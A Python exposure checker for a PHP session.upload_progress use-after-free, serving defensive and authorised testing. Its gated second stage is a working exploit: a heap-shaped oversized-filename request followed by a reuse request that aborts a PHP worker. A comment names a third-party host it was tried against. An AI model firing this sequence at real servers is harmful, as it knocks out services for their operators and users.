#!/usr/bin/env python3
"""
check_url.py — is *this* PHP site exposed to the session.upload_progress
cross-request use-after-free?

Two stages, on purpose:

  stage 1  fingerprint        safe. Normal-sized requests. Tells you whether the
                              preconditions are visible from outside.
  stage 2  proof of impact    destructive. One arm request, one fire request.
                              Aborts a PHP worker. Requires --authorized and,
                              for anything that is not loopback/private,
                              --allow-public.

Usage
  python3 check_url.py https://example.com/
  python3 check_url.py https://example.com/ --json
  python3 check_url.py http://127.0.0.1:8080/ --prove --authorized "lab only"
  python3 check_url.py https://client.example/ --prove --authorized "RoE #2026-114, signed 2026-10-01"

Read this before trusting the verdict
  PHP exposes no reliable passive signal for "session.upload_progress is on".
  The handler only starts a session when the request already carries a session
  id, and when it does, it adopts that id instead of issuing a new cookie — so
  there is nothing to observe in the response. Measured, not assumed: see
  docs/03-validation.md §3.9.

  What stage 1 can tell you: it is PHP, it is in the affected release range, and
  the edge will let a multi-megabyte part through to it. What it cannot tell
  you: the value of memory_limit. That value decides whether the arm request can
  ever reach the out-of-memory that orphans the serializer state.

  Therefore: NO SIGNAL IS NOT A CLEAN BILL OF HEALTH. If you own the host, read
  its ini (`tools/check_exposure.py`) or run the local lab. If you are testing
  under authorisation, stage 2 is the only definitive answer.

Exit codes: 0 = no signal / not PHP, 1 = likely exposed, 2 = error,
            3 = proof succeeded (worker died), 4 = proof inconclusive.
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import random
import socket
import ssl
import sys
import time
import urllib.parse

VERSION = "1.0"
UA = "php-session-uaf-check/%s (+https://github.com/RemiPelloux/php-session-upload-progress-uaf)" % VERSION

# Releases named by the public writeup. The code path itself is much older, so
# this list is informational, not a boundary.
NAMED_RELEASES = {"8.5.11", "8.4.26", "8.3.35", "8.2.34"}
PHP_MINOR_AFFECTED = ("8.2", "8.3", "8.4", "8.5")

PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"


# --------------------------------------------------------------------------- #
# transport
# --------------------------------------------------------------------------- #
class Resp:
    def __init__(self, status=None, headers=None, body=b"", elapsed=0.0, error=None):
        self.status = status
        self.headers = headers or {}          # lower-case name -> [values]
        self.body = body
        self.elapsed = elapsed
        self.error = error

    @property
    def ok(self) -> bool:
        return self.error is None and self.status is not None

    def h(self, name: str, default=None):
        v = self.headers.get(name.lower())
        return v[0] if v else default

    def cookies(self) -> list[str]:
        return self.headers.get("set-cookie", [])


class Target:
    def __init__(self, url: str, timeout: float, insecure: bool):
        self.url = url
        u = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
        self.scheme = u.scheme or "https"
        self.host = u.hostname or ""
        self.port = u.port or (443 if self.scheme == "https" else 80)
        self.path = (u.path or "/") + (("?" + u.query) if u.query else "")
        self.timeout = timeout
        self.insecure = insecure

    def request(self, method="GET", body: bytes | None = None, headers: dict | None = None) -> Resp:
        hdrs = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}
        hdrs.update(headers or {})
        if body is not None:
            hdrs["Content-Length"] = str(len(body))
        start = time.time()
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            if self.scheme == "https":
                ctx = ssl.create_default_context()
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            head = [f"{method} {self.path} HTTP/1.1", f"Host: {self.host}"
                    + ("" if self.port in (80, 443) else f":{self.port}")]
            head += [f"{k}: {v}" for k, v in hdrs.items()]
            sock.sendall(("\r\n".join(head) + "\r\n\r\n").encode() + (body or b""))

            buf = b""
            deadline = start + self.timeout
            while b"\r\n\r\n" not in buf:
                if time.time() > deadline or len(buf) > 262144:
                    break
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk

            if b"\r\n\r\n" not in buf:
                sock.close()
                return Resp(elapsed=time.time() - start,
                            error="connection closed before response headers")

            raw_head, rest = buf.split(b"\r\n\r\n", 1)
            lines = raw_head.decode("latin-1").split("\r\n")
            status = int(lines[0].split()[1]) if len(lines[0].split()) > 1 else None
            headers: dict[str, list[str]] = {}
            for line in lines[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    headers.setdefault(k.lower().strip(), []).append(v.strip())

            clen = headers.get("content-length", [None])[0]
            body_bytes = rest
            try:
                want = int(clen) if clen else None
            except ValueError:
                want = None
            # with Connection: close, read to EOF when there is no length
            limit = min(want, 65536) if want is not None else 65536
            while len(body_bytes) < limit:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                body_bytes += chunk
            sock.close()
            return Resp(status, headers, body_bytes, time.time() - start)
        except (socket.timeout, OSError, ssl.SSLError) as exc:
            return Resp(elapsed=time.time() - start, error=f"{type(exc).__name__}: {exc}")


# --------------------------------------------------------------------------- #
# request builders
# --------------------------------------------------------------------------- #
def multipart(progress: str | None, filename: str | None, filedata: bytes = b"x",
              extra_fields: dict | None = None, sid: str | None = None) -> tuple[bytes, str]:
    # NOTE: the boundary must not start with '-' — PHP's multipart parser then
    # skips the part entirely, the progress field is never seen, and the whole
    # probe silently looks like "handler disabled". Measured, see docs/03 §3.10.
    boundary = "uafcheck" + "".join(random.choice("0123456789abcdef") for _ in range(24))
    out = b""
    if progress is not None:
        out += (f"--{boundary}\r\nContent-Disposition: form-data; "
                f'name="{PROGRESS_FIELD}"\r\n\r\n{progress}\r\n').encode()
    for k, v in (extra_fields or {}).items():
        out += (f"--{boundary}\r\nContent-Disposition: form-data; "
                f'name="{k}"\r\n\r\n{v}\r\n').encode()
    if filename is not None:
        out += (f"--{boundary}\r\nContent-Disposition: form-data; "
                f'name="upfile"; filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n").encode()
        out += filedata + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return out, f"multipart/form-data; boundary={boundary}"


def post_multipart(t: Target, body: bytes, ctype: str, sid: str | None = None,
                   cookie: bool = True) -> Resp:
    hdrs = {"Content-Type": ctype}
    if sid and cookie:
        hdrs["Cookie"] = f"PHPSESSID={sid}"
    return t.request("POST", body, hdrs)


# --------------------------------------------------------------------------- #
# stage 1 — fingerprint
# --------------------------------------------------------------------------- #
def version_tuple(text: str) -> tuple[int, ...] | None:
    try:
        parts = text.split(".")
        return tuple(int("".join(c for c in p if c.isdigit()) or 0) for p in parts[:3])
    except ValueError:
        return None


def stage1(t: Target, max_part: int) -> dict:
    r: dict = {"target": t.url, "signals": {}, "notes": []}

    base = t.request("GET")
    r["signals"]["baseline"] = {
        "status": base.status, "error": base.error,
        "server": base.h("server"), "powered_by": base.h("x-powered-by"),
        "set_cookie": base.cookies(), "elapsed_ms": round(base.elapsed * 1000),
    }
    if not base.ok:
        r["notes"].append(f"baseline failed: {base.error}")
        r["verdict"] = "UNREACHABLE"
        return r

    php_header = base.h("x-powered-by") or ""
    server = (base.h("server") or "").lower()
    php_seen = "php" in php_header.lower()
    php_version = php_header.split("PHP/")[-1].strip() if "PHP/" in php_header else None

    # multipart with a progress field, carrying a session id (required: the
    # handler breaks out early when it has no session id)
    sid = "uafcheck" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(18))
    body, ctype = multipart("uafcheck-token", "a.txt", sid=sid)
    prog = post_multipart(t, body, ctype, sid)
    r["signals"]["progress_probe"] = {
        "status": prog.status, "error": prog.error,
        "set_cookie": prog.cookies(), "elapsed_ms": round(prog.elapsed * 1000),
    }
    if not prog.ok:
        r["notes"].append("progress probe did not complete; the endpoint may reject POST")

    # does the edge pass a large part through at all? this is the gate the real
    # arm request has to cross: post_max_size, proxy body limits, WAFs
    big_name = "F" * max_part
    body_big, ctype_big = multipart("uafcheck-token", big_name, sid=sid)
    big = post_multipart(t, body_big, ctype_big, sid)
    # A 4xx is NOT a rejection of the body: PHP parses multipart during request
    # startup, so by the time Laravel answers 405/419/422 the rfc1867 callback
    # has already run. Measured on dev-api.openpro.ai: POST / returns 405 with
    # the part fully parsed, and a 64 MB filename still reaches memory_limit.
    # Only the proxy-level body-cap answers mean the part never arrived.
    edge_refused = big.ok and big.status in (413, 414, 431)
    accepted = big.ok and big.status is not None and not edge_refused and big.status < 500
    r["signals"]["large_part"] = {
        "status": big.status, "error": big.error,
        "part_bytes": max_part, "accepted": accepted,
        "edge_refused": edge_refused,
        "elapsed_ms": round(big.elapsed * 1000),
    }
    if edge_refused:
        r["notes"].append(f"edge rejected the oversized part with HTTP {big.status} "
                          "— a large-filename arm request will not reach PHP")
    elif big.ok and big.status and 400 <= big.status < 500:
        r["notes"].append(f"HTTP {big.status} came from the application, not the proxy: the body "
                          "was parsed before routing, so this does not rule the handler out")

    # is it PHP at all?
    cookies = " ".join(base.cookies() + prog.cookies())
    if not php_seen and "phpsessid" in cookies.lower():
        php_seen = True
        r["notes"].append("PHP inferred from a PHPSESSID cookie (X-Powered-By hidden)")
    if not php_seen and "php" in server:
        php_seen = True
        r["notes"].append("PHP inferred from the Server header")

    r["php"] = {"detected": php_seen, "version": php_version}
    if php_version:
        v = version_tuple(php_version)
        if php_version in NAMED_RELEASES:
            r["notes"].append(f"PHP {php_version} is one of the releases the public writeup names")
        elif v and ".".join(map(str, v[:2])) in PHP_MINOR_AFFECTED:
            r["notes"].append(f"PHP {php_version} is in an affected minor line")

    # verdict
    if not php_seen:
        r["verdict"] = "NOT_PHP"
        r["notes"].append("no PHP fingerprint — either not PHP, or the headers are stripped "
                          "by a proxy. Confirm with the owner before concluding anything.")
        r["confidence"] = "low"
    elif not accepted:
        r["verdict"] = "NOT_DETECTED"
        r["confidence"] = "medium"
        r["notes"].append("PHP detected but the large part was refused before it reached PHP; "
                          "the arm request cannot build a large progress array through this path")
    else:
        r["verdict"] = "LIKELY_EXPOSED"
        r["confidence"] = "low"
        r["notes"].append(
            "PHP reachable with large multipart parts. Whether the arm request can exhaust "
            "memory_limit is not observable from outside; that setting decides exposure. "
            "Read the ini if you own it, or use --prove under authorisation.")
    return r


# --------------------------------------------------------------------------- #
# stage 2 — proof of impact (destructive)
# --------------------------------------------------------------------------- #
def target_is_local(t: Target) -> bool:
    host = t.host.strip("[]")
    if host in ("localhost",):
        return True
    try:
        addrs = {ai[4][0] for ai in socket.getaddrinfo(host, None)}
    except OSError:
        return False
    for addr in addrs:
        try:
            ip = ipaddress.ip_address(addr)
        except ValueError:
            continue
        if ip.is_loopback or ip.is_private or ip.is_link_local:
            return True
    return False


def alive(t: Target, tries: int = 3) -> tuple[bool, list]:
    log = []
    for i in range(tries):
        r = t.request("GET")
        log.append({"try": i + 1, "status": r.status, "error": r.error})
        if r.ok:
            return True, log
        time.sleep(0.4)
    return False, log


def stage2(t: Target, arm_bytes: int, wait: float) -> dict:
    out: dict = {"stage": "proof", "target": t.url, "arm_part_bytes": arm_bytes}
    ok_before, log_before = alive(t, 2)
    out["liveness_before"] = {"alive": ok_before, "log": log_before}
    if not ok_before:
        out["result"] = "TARGET_DOWN_BEFORE_TEST"
        return out

    # Two distinct session ids on purpose. The arm request bails out of
    # php_session_flush() on the memory_limit fatal, which skips the unlock: the
    # session lock it took is leaked (the fd is still held by the worker). If the
    # fire request reused that id it would block on its own leaked lock and never
    # reach the serializer. Measured, see docs/03-validation.md §3.11.
    sid_arm = "uafcheck" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(18))
    sid_fire = "uafcheck" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(18))

    # arm: one multipart part whose *filename* is large. That name is copied into
    # the progress array, which is serialised during request startup.
    body, ctype = multipart("uafcheck-arm", "F" * arm_bytes, sid=sid_arm)
    out["arm_request_bytes"] = len(body)
    arm = post_multipart(t, body, ctype, sid_arm)
    arm_text = arm.body.decode("latin-1", "replace")
    oom = "Allowed memory size" in arm_text or "Allowed memory exhausted" in arm_text
    out["arm"] = {"status": arm.status, "error": arm.error,
                  "elapsed_ms": round(arm.elapsed * 1000),
                  "oom_observed": oom}
    if oom:
        out["notes"] = ["a memory_limit fatal happened during request startup "
                        "('in Unknown on line 0'). Note this fires from parsing the "
                        "large part itself, so on its own it does not prove the "
                        "serializer ran — only that the target is memory-tight "
                        "enough for the arm to reach the bailout"]

    time.sleep(wait)

    # fire: the request that reuses the orphaned serialize context
    body2, ctype2 = multipart("uafcheck-fire", "a.txt", sid=sid_fire)
    fire = post_multipart(t, body2, ctype2, sid_fire)
    out["fire"] = {"status": fire.status, "error": fire.error,
                   "elapsed_ms": round(fire.elapsed * 1000)}

    time.sleep(max(wait, 0.5))
    ok_after, log_after = alive(t, 3)
    out["liveness_after"] = {"alive": ok_after, "log": log_after}

    died = (not ok_after) or (fire.error is not None and fire.error != "")
    if died and not ok_after:
        out["result"] = "WORKER_DIED"
    elif fire.error is not None:
        out["result"] = "FIRE_CONNECTION_DIED"
    elif oom:
        out["result"] = "OOM_REACHED_NO_ABORT"
    else:
        out["result"] = "SURVIVED"
    return out


# --------------------------------------------------------------------------- #
# reporting
# --------------------------------------------------------------------------- #
def bar(ch="=") -> str:
    return ch * 72


def print_stage1(r: dict) -> None:
    print(bar())
    print(f" stage 1 — fingerprint   {r['target']}")
    print(bar())
    if r["verdict"] == "UNREACHABLE":
        print(" baseline      FAILED — " + "; ".join(r["notes"]))
        print()
        print(" VERDICT       UNREACHABLE")
        print("   - no HTTP response: wrong host/port, TLS problem, or a firewall.")
        print("   - nothing was concluded. Try --insecure, or another path.")
        return

    b = r["signals"]["baseline"]
    print(f" baseline      HTTP {b['status']}  {b['elapsed_ms']} ms")
    if b["server"]:
        print(f" server        {b['server']}")
    if b["powered_by"]:
        print(f" powered-by    {b['powered_by']}")
    if b["set_cookie"]:
        print(f" set-cookie    {' | '.join(b['set_cookie'])[:160]}")

    p = r["signals"]["progress_probe"]
    print(f" progress      HTTP {p['status']}  {p['elapsed_ms']} ms"
          + (f"  (error: {p['error']})" if p["error"] else ""))

    lp = r["signals"]["large_part"]
    print(f" large part    {lp['part_bytes']} B -> HTTP {lp['status']}"
          f"  accepted={lp['accepted']}  {lp['elapsed_ms']} ms")

    print()
    print(f" VERDICT       {r['verdict']}   (confidence: {r.get('confidence', 'n/a')})")
    for n in r["notes"]:
        print(f"   - {n}")
    print()
    if r["verdict"] == "LIKELY_EXPOSED":
        print(" Next steps")
        print("   - you own the host  -> python3 tools/check_exposure.py   (reads the ini)")
        print("   - authorised test   -> --prove --authorized \"<scope ref>\"")
        print("   - mitigation        -> REMEDIATION.md")


def print_stage2(r: dict) -> None:
    print()
    print(bar())
    print(f" stage 2 — proof of impact   {r['target']}")
    print(bar())
    print(" WARNING: this aborts a PHP worker. In-flight requests on that worker die.")
    print(f" liveness before   {'ok' if r['liveness_before']['alive'] else 'FAILED'}")
    a = r["arm"]
    print(f" arm               HTTP {a['status']}  {a['elapsed_ms']} ms"
          f"  ({r['arm_part_bytes']} B filename, {r['arm_request_bytes']} B request)"
          + (f"  error: {a['error']}" if a["error"] else ""))
    print(f"   memory_limit fatal in arm response: {'YES' if a['oom_observed'] else 'no'}")
    f = r["fire"]
    print(f" fire              HTTP {f['status']}  {f['elapsed_ms']} ms"
          + (f"  error: {f['error']}" if f["error"] else ""))
    print(f" liveness after    {'ok' if r['liveness_after']['alive'] else 'FAILED'}")
    print()
    print(f" RESULT            {r['result']}")
    for n in r.get("notes", []):
        print(f"   - {n}")
    if r["result"] == "WORKER_DIED":
        print("   The worker stopped answering right after the reuse request. That is the")
        print("   bug: freed serialize context reused, allocator aborted.")
    elif r["result"] == "FIRE_CONNECTION_DIED":
        print("   The connection carrying the second request died. Consistent with the")
        print("   worker aborting mid-response; re-run once to confirm it is repeatable.")
    elif r["result"] == "OOM_REACHED_NO_ABORT":
        print("   The arm exhausted memory_limit during request startup, but the reuse")
        print("   request did not trip the allocator. Two very different explanations:")
        print("     a) the handler is off or the bug is fixed -> nothing was orphaned")
        print("     b) the handler is on -> the state is orphaned, but this heap layout")
        print("        did not put the freed 64-byte block under a fatal allocation")
        print("   These are indistinguishable from outside. Check the ini if you own the")
        print("   host (tools/check_exposure.py); otherwise do not call it clean.")
    else:
        print("   Target survived and the arm did not exhaust memory_limit. This does NOT")
        print("   clear it — a different filename size or a lower limit could still reach")
        print("   the orphaned state. Read the target's ini (tools/check_exposure.py).")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Check whether a PHP site is exposed to the session.upload_progress cross-request UAF",
        epilog="stage 1 is safe; stage 2 (--prove) aborts a worker and needs authorisation")
    ap.add_argument("url", help="target URL, e.g. https://example.com/upload")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--max-part", type=int, default=1 << 20,
                    help="size of the large filename in the stage-1 probe (default 1 MiB)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--prove", action="store_true",
                    help="stage 2: send the arm + fire sequence (DESTRUCTIVE)")
    ap.add_argument("--arm-bytes", type=int, default=2_000_000,
                    help="filename length for the arm request (default 2,000,000). "
                         "This is a heap-shaping parameter, not just 'make it big': "
                         "2**21 allocates in a different size class and does not abort "
                         "on the reference build (docs/02-heap-layout.md §2.8)")
    ap.add_argument("--wait", type=float, default=0.5)
    ap.add_argument("--authorized", metavar="REF",
                    help="who authorised this test (ticket, RoE reference, contract id). "
                         "Required for --prove.")
    ap.add_argument("--allow-public", action="store_true",
                    help="permit --prove against a non-private address")
    args = ap.parse_args()

    t = Target(args.url, args.timeout, args.insecure)
    if not t.host:
        print("could not parse a host from the URL", file=sys.stderr)
        return 2

    # gates first: a refused --prove must not send a single packet
    local = target_is_local(t)
    if args.prove:
        if not args.authorized:
            print("refusing --prove: pass --authorized \"<scope reference>\" first.", file=sys.stderr)
            print("this stage aborts a worker; it is not a read-only check.", file=sys.stderr)
            return 2
        if not local and not args.allow_public:
            print(f"refusing --prove against {t.host}: not a loopback/private address.", file=sys.stderr)
            print("pass --allow-public together with --authorized if this host is in scope.", file=sys.stderr)
            return 2

    report = {"tool": f"check_url.py {VERSION}", "time_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}

    s1 = stage1(t, args.max_part)
    report["stage1"] = s1
    if not args.json:
        print_stage1(s1)

    code = 0 if s1["verdict"] in ("NOT_PHP", "NOT_DETECTED") else 1
    if s1["verdict"] == "UNREACHABLE":
        code = 2

    if args.prove:
        if s1["verdict"] == "UNREACHABLE":
            print("\nskipping --prove: the target is not answering.", file=sys.stderr)
            return 2
        if not local:
            print(f"\n!! {t.host} is remote. This will abort one worker if it is vulnerable.")
            print(f"!! authorisation on record: {args.authorized}")
            print("!! sending in 3s — ctrl-c to abort")
            time.sleep(3)

        s2 = stage2(t, args.arm_bytes, args.wait)
        s2["authorized_by"] = args.authorized
        s2["local_target"] = local
        report["stage2"] = s2
        if not args.json:
            print_stage2(s2)
        if s2["result"] in ("WORKER_DIED", "FIRE_CONNECTION_DIED"):
            code = 3
        else:
            code = 4

    if args.json:
        print(json.dumps(report, indent=2))
    return code


if __name__ == "__main__":
    sys.exit(main())
